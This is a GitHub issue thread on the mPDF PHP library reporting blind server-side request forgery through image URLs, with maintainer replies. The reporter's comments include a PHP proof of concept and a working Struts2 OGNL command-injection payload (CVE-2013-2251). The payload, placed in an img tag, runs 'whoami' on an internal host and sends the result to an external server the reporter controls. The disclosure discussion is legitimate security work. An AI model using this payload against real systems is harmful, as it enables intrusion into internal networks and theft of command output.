=== Content from github.com_2ff45253_20250110_213203.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmpdf%2Fmpdf%2Fissues%2F867)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmpdf%2Fmpdf%2Fissues%2F867)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=mpdf%2Fmpdf)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mpdf](/mpdf)
/
**[mpdf](/mpdf/mpdf)**
Public

* [Notifications](/login?return_to=%2Fmpdf%2Fmpdf) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Fmpdf%2Fmpdf)
* [Star
   4.4k](/login?return_to=%2Fmpdf%2Fmpdf)

* [Code](/mpdf/mpdf)
* [Issues
  298](/mpdf/mpdf/issues)
* [Pull requests
  32](/mpdf/mpdf/pulls)
* [Discussions](/mpdf/mpdf/discussions)
* [Actions](/mpdf/mpdf/actions)
* [Projects
  0](/mpdf/mpdf/projects)
* [Security](/mpdf/mpdf/security)
* [Insights](/mpdf/mpdf/pulse)

Additional navigation options

* [Code](/mpdf/mpdf)
* [Issues](/mpdf/mpdf/issues)
* [Pull requests](/mpdf/mpdf/pulls)
* [Discussions](/mpdf/mpdf/discussions)
* [Actions](/mpdf/mpdf/actions)
* [Projects](/mpdf/mpdf/projects)
* [Security](/mpdf/mpdf/security)
* [Insights](/mpdf/mpdf/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fmpdf%2Fmpdf%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fmpdf%2Fmpdf%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Possible SSRF with URLs of external resources #867

Closed

[maplebluex](/maplebluex) opened this issue
Sep 26, 2018
· 10 comments

Closed

# [Possible SSRF with URLs of external resources](#top) #867

[maplebluex](/maplebluex) opened this issue
Sep 26, 2018
· 10 comments

Labels
[feature/enhancement](/mpdf/mpdf/labels/feature/enhancement)
[question](/mpdf/mpdf/labels/question)
[research needed](/mpdf/mpdf/labels/research%20needed)

## Comments

[![@maplebluex](https://avatars.githubusercontent.com/u/42228142?s=80&v=4)](/maplebluex)

Copy link

### **[maplebluex](/maplebluex)** commented [Sep 26, 2018](#issue-364008546) • edited Loading

| Hello, when I was do some security test. I found a vulnerability that may lead to ssrf of the server which host a html2pdf service with mPDF. The poc is as follow:  ``` <?php error_reporting(E_ALL);  ini_set('display_errors', 1); require_once __DIR__ . '/vendor/autoload.php';  $mpdf = new \Mpdf\Mpdf(); //$mpdf->WriteHTML('<h1>Hello world!</h1>'); $mpdf->WriteHTML('<?xml version="1.0"?> <img src="http://192.168.0.2:16666/1.jpg"> '); $mpdf->Output("test1.pdf",'F');  ```  the another server (192.168.0.2) will get a request from above  In real scenario the poc may be sent from font end . so attacker will send this to server side and trigger a SSRF bug which may lead to attack private network  mPDF version:v7.1.5 OS:UBUNTU 16.0.4 |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@finwe](https://avatars.githubusercontent.com/u/195675?s=40&u=a2ec7587450c09ff8a7e227e0a4d3cf31ae3f5fe&v=4)](/finwe)
[finwe](/finwe)
added
[question](/mpdf/mpdf/labels/question)
[research needed](/mpdf/mpdf/labels/research%20needed)
labels
[Sep 26, 2018](#event-1868485708)

[![@finwe](https://avatars.githubusercontent.com/u/195675?s=80&u=a2ec7587450c09ff8a7e227e0a4d3cf31ae3f5fe&v=4)](/finwe)

Copy link

Member

### **[finwe](/finwe)** commented [Sep 26, 2018](#issuecomment-424724323)

| It seems to me it is a concern of the user of the library to prevent external changes to mPDF templates loading external resources.  The library itself cannot decide which resources to allow and which to deny unless it would deny all external resources, which is a no-go.  Can you elaborate? |
| --- |

All reactions

Sorry, something went wrong.

[![@MatthiasKuehneEllerhold](https://avatars.githubusercontent.com/u/19988979?s=80&u=d14c10af6be0741738abe548f012aa8f15c6935c&v=4)](/MatthiasKuehneEllerhold)

Copy link

### **[MatthiasKuehneEllerhold](/MatthiasKuehneEllerhold)** commented [Sep 26, 2018](#issuecomment-424730096)

| Mh it would be **nice** to whitelist / blacklist hosts to load external resources from. Is there an easy way to to this or add this currently? |
| --- |

All reactions

Sorry, something went wrong.

[![@finwe](https://avatars.githubusercontent.com/u/195675?s=80&u=a2ec7587450c09ff8a7e227e0a4d3cf31ae3f5fe&v=4)](/finwe)

Copy link

Member

### **[finwe](/finwe)** commented [Sep 26, 2018](#issuecomment-424734007)

| No, there isn't. |
| --- |

All reactions

Sorry, something went wrong.

[![@finwe](https://avatars.githubusercontent.com/u/195675?s=40&u=a2ec7587450c09ff8a7e227e0a4d3cf31ae3f5fe&v=4)](/finwe)
[finwe](/finwe)
changed the title
~~hello,I find a security bug of mpdf~~
Possible SSRF with URLs of external resources
[Sep 26, 2018](#event-1868578163)

[![@maplebluex](https://avatars.githubusercontent.com/u/42228142?s=80&v=4)](/maplebluex)

Copy link

Author

### **[maplebluex](/maplebluex)** commented [Sep 26, 2018](#issuecomment-424763559)

| well, I was play with a private bug bounty program some days ago. And found one of target server with a html2pdf service of mPDF, then I found when I modify some content which would be transformed. from:  ``` <img src="http://some.cdn.com">  ```  to:  ``` <img src="http://some.intranet.ip:port">   ```  It make a request to intranet server. It is a ssrf! I successfully reach the intranet by this way. After some recon, I got a strust2 bug in one of the intranet server. and exploited it with this ssrf  ``` <img src="http://target.intranet.ip:port/poc?of#strust2">  ```  So I think this 'character ' may be dangerous in some scenario, and I agree your words:'The library itself cannot decide which resources to allow and which to deny '. But I think it would be better have a switch(config option?) to choose let this mpdf to get the intranet resources or not. |
| --- |

All reactions

Sorry, something went wrong.

[![@finwe](https://avatars.githubusercontent.com/u/195675?s=40&u=a2ec7587450c09ff8a7e227e0a4d3cf31ae3f5fe&v=4)](/finwe)
[finwe](/finwe)
added
the
[feature/enhancement](/mpdf/mpdf/labels/feature/enhancement)
label
[Sep 26, 2018](#event-1869482122)

[![@finwe](https://avatars.githubusercontent.com/u/195675?s=80&u=a2ec7587450c09ff8a7e227e0a4d3cf31ae3f5fe&v=4)](/finwe)

Copy link

Member

### **[finwe](/finwe)** commented [Sep 26, 2018](#issuecomment-424866157)

| A few remarks:   * AFAIK only GET requests are possible with src attributes of HTML elements * AFAIK no data from the server are displayed in the PDF unless the content type is actually an image (the Annotations bug has been already addressed) * Can you be more specific about the "exploit" of the struts (I believe you have a typo there) "bug" you are mentioning? Some references? What exact threats are possible using this approach?   Whole path handling calls for a refactoring, yes, I guess we can incorporate a blacklist/whitelist while doing that. Will make a separate feature request for that. |
| --- |

All reactions

Sorry, something went wrong.

[![@finwe](https://avatars.githubusercontent.com/u/195675?s=80&u=a2ec7587450c09ff8a7e227e0a4d3cf31ae3f5fe&v=4)](/finwe)

Copy link

Member

### **[finwe](/finwe)** commented [Sep 26, 2018](#issuecomment-424867395)

| [#868](https://github.com/mpdf/mpdf/issues/868) |
| --- |

All reactions

Sorry, something went wrong.

[![@maplebluex](https://avatars.githubusercontent.com/u/42228142?s=80&v=4)](/maplebluex)

Copy link

Author

### **[maplebluex](/maplebluex)** commented [Sep 27, 2018](#issuecomment-424959443)

| Thanks for your reply. I will write the answers one by one.   1. Yeah, but GET requests is enough to exploit many bugs 2. Yeah, but what I need is smuggle my payload to the intranet, there would be better if I can get the response in the PDF. Just as you said, I cant get the data displayed because the content type is NOT an image. So this is a *blind ssrf*, which means attacker could send payload to the target, but can not get the response from the PDF. 3. Sorry for my typo, my poc is as follow:  ``` <img src="http://127.0.0.1:16666//index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%27whoami%27})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23t%3d%23d.readLine(),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.setContentType(%27text/html%27),%23matt.getWriter().println(%23e),%23u%3d%22http://111.112.113.114:9999/result%3d%22.concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod(%22GET%22),%23http.connect(),%23http.getInputStream()}">  ```  For more detail about this bug, plz search [CVE-2013-2251](https://github.com/advisories/GHSA-47qp-8v9g-39hp "CVE-2013-2251").  In a word, this bug could be triggered with a single GET request, and it will execute any command in the vulnerable server. Also the poc was well-designed to send back the result to my VPS(<http://111.112.113.114:9999/result>). All that I need is make the server to send a GET requests to the intranet. |
| --- |

All reactions

Sorry, something went wrong.

[![@jakejackson1](https://avatars.githubusercontent.com/u/2918419?s=80&u=f8f5ce905f87e4518b043483b036e0dbca8ee18d&v=4)](/jakejackson1)

Copy link

Contributor

### **[jakejackson1](/jakejackson1)** commented [Sep 27, 2018](#issuecomment-424961321) • edited Loading

| [@maplebluex](https://github.com/maplebluex) I appreciate what you're saying, but it's not our job to sanitise your input. If you allow users to pass HTML without sanitising it, you're asking for trouble. |
| --- |

 👍
1
 finwe reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@maplebluex](https://avatars.githubusercontent.com/u/42228142?s=80&v=4)](/maplebluex)

Copy link

Author

### **[maplebluex](/maplebluex)** commented [Sep 27, 2018](#issuecomment-424967501)

| [@jakejackson1](https://github.com/jakejackson1) Yeah, in fact the input should be sanitized, but many users do not know how to do it, so I think it would be better to have a choice inside of the mPDF |
| --- |

All reactions

Sorry, something went wrong.

[![@finwe](https://avatars.githubusercontent.com/u/195675?s=80&u=a2ec7587450c09ff8a7e227e0a4d3cf31ae3f5fe&v=4)](/finwe)

Copy link

Member

### **[finwe](/finwe)** commented [Sep 27, 2018](#issuecomment-424987171)

| Closing this, the new feature request remains open. |
| --- |

All reactions

Sorry, something went wrong.

[![@finwe](https://avatars.githubusercontent.com/u/195675?s=40&u=a2ec7587450c09ff8a7e227e0a4d3cf31ae3f5fe&v=4)](/finwe)
[finwe](/finwe)
closed this as [completed](/mpdf/mpdf/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Sep 27, 2018](#event-1870271162)

[![@nwse-ghm](https://avatars.githubusercontent.com/u/108886680?s=40&v=4)](/nwse-ghm)
[nwse-ghm](/nwse-ghm)
mentioned this issue
[Dec 12, 2022](#ref-issue-1453819626)

[Local File Read and SSRF vulnerability via img tags
#1763](/mpdf/mpdf/issues/1763)

Open

1 task

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fmpdf%2Fmpdf%2Fissues%2F867)

Assignees

No one assigned

Labels

[feature/enhancement](/mpdf/mpdf/labels/feature/enhancement)
[question](/mpdf/mpdf/labels/question)
[research needed](/mpdf/mpdf/labels/research%20needed)

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

4 participants

[![@finwe](https://avatars.githubusercontent.com/u/195675?s=52&v=4)](/finwe) [![@jakejackson1](https://avatars.githubusercontent.com/u/2918419?s=52&v=4)](/jakejackson1) [![@MatthiasKuehneEllerhold](https://avatars.githubusercontent.com/u/19988979?s=52&v=4)](/MatthiasKuehneEllerhold) [![@maplebluex](https://avatars.githubusercontent.com/u/42228142?s=52&v=4)](/maplebluex)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


